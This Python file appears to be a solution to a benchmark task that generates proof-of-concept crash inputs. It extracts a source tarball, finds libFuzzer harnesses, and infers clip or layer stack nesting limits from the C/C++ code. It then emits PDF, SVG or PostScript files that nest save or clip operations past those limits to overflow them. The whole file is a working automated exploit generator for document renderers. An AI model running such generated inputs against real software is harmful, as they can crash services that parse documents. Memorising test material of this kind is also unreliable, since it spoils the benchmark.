import os
import re
import tarfile
import tempfile
from typing import List, Optional, Tuple


class Solution:
    def _safe_extract_tar(self, tar_path: str, out_dir: str) -> None:
        def is_within_directory(directory: str, target: str) -> bool:
            abs_directory = os.path.abspath(directory)
            abs_target = os.path.abspath(target)
            return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])

        with tarfile.open(tar_path, "r:*") as tar:
            members = tar.getmembers()
            for m in members:
                target = os.path.join(out_dir, m.name)
                if not is_within_directory(out_dir, target):
                    continue
                try:
                    tar.extract(m, out_dir)
                except Exception:
                    pass

    def _find_root_dir(self, base_dir: str) -> str:
        try:
            entries = [e for e in os.listdir(base_dir) if e not in (".", "..")]
        except Exception:
            return base_dir
        dirs = [e for e in entries if os.path.isdir(os.path.join(base_dir, e))]
        files = [e for e in entries if os.path.isfile(os.path.join(base_dir, e))]
        if len(dirs) == 1 and len(files) == 0:
            return os.path.join(base_dir, dirs[0])
        return base_dir

    def _iter_source_files(self, root: str, exts: Tuple[str, ...], max_files: int = 4000) -> List[str]:
        res = []
        for dirpath, dirnames, filenames in os.walk(root):
            dirnames[:] = [d for d in dirnames if d not in (".git", ".svn", ".hg", "build", "out", "dist", "third_party", "external", "externals")]
            for fn in filenames:
                if fn.lower().endswith(exts):
                    res.append(os.path.join(dirpath, fn))
                    if len(res) >= max_files:
                        return res
        return res

    def _read_file_bytes_limited(self, path: str, limit: int = 1024 * 1024) -> bytes:
        try:
            with open(path, "rb") as f:
                return f.read(limit)
        except Exception:
            return b""

    def _read_file_text_limited(self, path: str, limit: int = 1024 * 1024) -> str:
        data = self._read_file_bytes_limited(path, limit)
        if not data:
            return ""
        try:
            return data.decode("utf-8", errors="ignore")
        except Exception:
            return data.decode("latin1", errors="ignore")

    def _find_fuzzer_sources(self, root: str) -> List[str]:
        exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")
        files = self._iter_source_files(root, exts, max_files=2500)
        fuzzers = []
        for p in files:
            b = self._read_file_bytes_limited(p, limit=512 * 1024)
            if b"LLVMFuzzerTestOneInput" in b or b"Honggfuzz" in b or b"FUZZ" in b"".join([b]):
                if b"LLVMFuzzerTestOneInput" in b:
                    fuzzers.append(p)
        return fuzzers

    def _detect_format(self, fuzzer_files: List[str]) -> str:
        hay = ""
        for p in fuzzer_files[:25]:
            hay += self._read_file_text_limited(p, limit=512 * 1024)
            hay += "\n"
        low = hay.lower()
        if any(k in low for k in ("rsvg_handle_new_from_data", "librsvg", "resvg", "usvg", "svg")) and "%pdf" not in low:
            return "svg"
        if any(k in low for k in ("postscript", "ghostscript", "gsapi", "eps")) and "%pdf" not in low:
            return "ps"
        if any(k in low for k in ("pdf", "fpdf_", "loadmemdocument", "fz_open_document", "poppler_document_new_from_data", "%pdf")):
            return "pdf"
        return "pdf"

    def _detect_needs_pdf_wrapper(self, fuzzer_files: List[str]) -> bool:
        hay = ""
        for p in fuzzer_files[:25]:
            hay += self._read_file_text_limited(p, limit=512 * 1024)
            hay += "\n"
        low = hay.lower()
        doc_keywords = (
            "loadmemdocument",
            "fpdf_loadmemdocument",
            "fpdf_loadcustomdocument",
            "fz_open_document",
            "fz_open_document_with_stream",
            "poppler_document_new_from_data",
            "pdf_load_document",
            "document::load",
            "open_document",
        )
        stream_keywords = (
            "content stream",
            "parsecontent",
            "parse_content",
            "contentparser",
            "interpret",
            "operator",
        )
        if any(k in low for k in doc_keywords):
            return True
        if any(k in low for k in stream_keywords) and "loadmemdocument" not in low and "open_document" not in low:
            return False
        return True

    def _infer_depth_limit_and_token(self, root: str) -> Tuple[Optional[int], Optional[bytes], Optional[bool]]:
        exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".inc")
        files = self._iter_source_files(root, exts, max_files=3000)

        keyword_needles = (b"clip mark", b"clip_mark", b"clipmark", b"layer/clip", b"layer clip", b"clip stack", b"layer stack", b"nesting depth", b"nesting_depth")
        candidate_files = []
        for p in files:
            b = self._read_file_bytes_limited(p, limit=256 * 1024)
            if not b:
                continue
            lb = b.lower()
            if any(n in lb for n in keyword_needles):
                candidate_files.append(p)
                if len(candidate_files) >= 60:
                    break

        limit_candidates = []
        token_char_candidates = []
        token_byte_candidates = []
        seen_pdfish = None

        re_arr = re.compile(r"(?:layer|clip|layerclip|layer_clip)[A-Za-z0-9_]*stack[A-Za-z0-9_]*\s*\[\s*(\d{2,7})\s*\]")
        re_max = re.compile(r"(?:#define\s+|const\s+int\s+|constexpr\s+int\s+|static\s+const\s+int\s+|enum\s*{[^}]*?)\b[A-Za-z0-9_]*(?:MAX|kMax|max)[A-Za-z0-9_]*(?:NEST|DEPTH|STACK)[A-Za-z0-9_]*\b\s*(?:=|,)\s*(\d{2,7})", re.MULTILINE | re.DOTALL)
        re_chk = re.compile(r"\b(?:nesting|depth)[A-Za-z0-9_]*\s*(?:>=|>|==)\s*(\d{2,7})")
        re_case_char = re.compile(r"case\s*'([^'\\])'\s*:")
        re_case_hex = re.compile(r"case\s*(0x[0-9a-fA-F]{1,2})\s*:")
        re_case_dec = re.compile(r"case\s*([0-9]{1,3})\s*:")

        for p in candidate_files:
            txt = self._read_file_text_limited(p, limit=1024 * 1024)
            if not txt:
                continue
            low = txt.lower()
            if seen_pdfish is None:
                seen_pdfish = ("pdf" in low) or ("stream" in low and "endstream" in low) or ("xref" in low)
            for m in re_arr.finditer(txt):
                try:
                    v = int(m.group(1))
                    if 32 <= v <= 2_000_000:
                        limit_candidates.append(v)
                except Exception:
                    pass
            for m in re_max.finditer(txt):
                try:
                    v = int(m.group(1))
                    if 32 <= v <= 2_000_000:
                        limit_candidates.append(v)
                except Exception:
                    pass
            if ("clip" in low or "layer" in low) and ("nest" in low or "depth" in low) and ("stack" in low):
                for m in re_chk.finditer(txt):
                    try:
                        v = int(m.group(1))
                        if 32 <= v <= 2_000_000:
                            limit_candidates.append(v)
                    except Exception:
                        pass

            lb = txt.encode("latin1", errors="ignore").lower()
            idx = -1
            for n in keyword_needles:
                j = lb.find(n)
                if j != -1 and (idx == -1 or j < idx):
                    idx = j
            if idx != -1:
                start = max(0, idx - 3000)
                end = min(len(lb), idx + 3000)
                snippet = lb[start:end].decode("latin1", errors="ignore")
                pos = idx - start
                before = snippet[:pos]
                chars = list(re_case_char.finditer(before))
                if chars:
                    token_char_candidates.append(chars[-1].group(1))
                hexes = list(re_case_hex.finditer(before))
                if hexes:
                    token_byte_candidates.append(int(hexes[-1].group(1), 16) & 0xFF)
                decs = list(re_case_dec.finditer(before))
                if decs:
                    token_byte_candidates.append(int(decs[-1].group(1)) & 0xFF)

        inferred_limit = None
        if limit_candidates:
            inferred_limit = max(limit_candidates)

        inferred_token = None
        if token_char_candidates:
            c = token_char_candidates[-1]
            if c and len(c) == 1 and 32 <= ord(c) <= 126:
                inferred_token = (c + "\n").encode("ascii", errors="ignore")
        elif token_byte_candidates:
            b = token_byte_candidates[-1]
            inferred_token = bytes([b])

        return inferred_limit, inferred_token, seen_pdfish

    def _build_pdf(self, stream_bytes: bytes) -> bytes:
        buf = bytearray()
        buf.extend(b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n")
        offsets = []

        def add_obj(num: int, payload: bytes) -> None:
            offsets.append(len(buf))
            buf.extend(f"{num} 0 obj\n".encode("ascii"))
            buf.extend(payload)
            if not payload.endswith(b"\n"):
                buf.extend(b"\n")
            buf.extend(b"endobj\n")

        add_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>\n")
        add_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n")
        add_obj(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Resources <<>> /Contents 4 0 R >>\n")
        stream_dict = f"<< /Length {len(stream_bytes)} >>\nstream\n".encode("ascii")
        stream_obj = stream_dict + stream_bytes + b"\nendstream\n"
        add_obj(4, stream_obj)

        xref_off = len(buf)
        n = 4
        buf.extend(b"xref\n")
        buf.extend(f"0 {n+1}\n".encode("ascii"))
        buf.extend(b"0000000000 65535 f \n")
        for off in offsets:
            buf.extend(f"{off:010d} 00000 n \n".encode("ascii"))
        buf.extend(b"trailer\n")
        buf.extend(f"<< /Size {n+1} /Root 1 0 R >>\n".encode("ascii"))
        buf.extend(b"startxref\n")
        buf.extend(f"{xref_off}\n".encode("ascii"))
        buf.extend(b"%%EOF\n")
        return bytes(buf)

    def _generate_pdf_poc(self, repeat_count: int, token: bytes, wrapper: bool) -> bytes:
        if token == b"":
            token = b"q\n"
        if token == b"q":
            token = b"q\n"
        if len(token) == 1 and 32 <= token[0] <= 126:
            token = token + b"\n"
        content = token * repeat_count
        if wrapper:
            return self._build_pdf(content)
        return content

    def _generate_svg_poc(self, repeat_count: int) -> bytes:
        pre = b'<svg xmlns="http://www.w3.org/2000/svg"><defs><clipPath id="c"><rect width="1" height="1"/></clipPath></defs>'
        open_tag = b'<g clip-path="url(#c)">'
        close_tag = b"</g>"
        post = b"</svg>"
        body = open_tag * repeat_count + close_tag * repeat_count
        return pre + body + post

    def _generate_ps_poc(self, repeat_count: int) -> bytes:
        pre = b"%!PS\n"
        token = b"gsave\n"
        return pre + token * repeat_count

    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory() as td:
            root = td
            if os.path.isdir(src_path):
                root = src_path
                root = self._find_root_dir(root)
            else:
                self._safe_extract_tar(src_path, td)
                root = self._find_root_dir(td)

            fuzzer_files = self._find_fuzzer_sources(root)
            fmt = self._detect_format(fuzzer_files)
            needs_wrapper = self._detect_needs_pdf_wrapper(fuzzer_files) if fmt == "pdf" else False

            inferred_limit, inferred_token, pdfish = self._infer_depth_limit_and_token(root)

            if fmt == "pdf":
                token = inferred_token if inferred_token else b"q\n"
                if inferred_limit is not None and 32 <= inferred_limit <= 2_000_000:
                    repeat_count = min(inferred_limit + 50, 2_000_000)
                else:
                    repeat_count = 420000
                if pdfish is False:
                    needs_wrapper = False
                return self._generate_pdf_poc(repeat_count, token, needs_wrapper)

            if fmt == "svg":
                if inferred_limit is not None and 32 <= inferred_limit <= 250_000:
                    repeat_count = min(inferred_limit + 20, 250_000)
                else:
                    repeat_count = 31000
                return self._generate_svg_poc(repeat_count)

            if fmt == "ps":
                if inferred_limit is not None and 32 <= inferred_limit <= 2_000_000:
                    repeat_count = min(inferred_limit + 100, 2_000_000)
                else:
                    repeat_count = 140000
                return self._generate_ps_poc(repeat_count)

            return self._generate_pdf_poc(420000, b"q\n", True)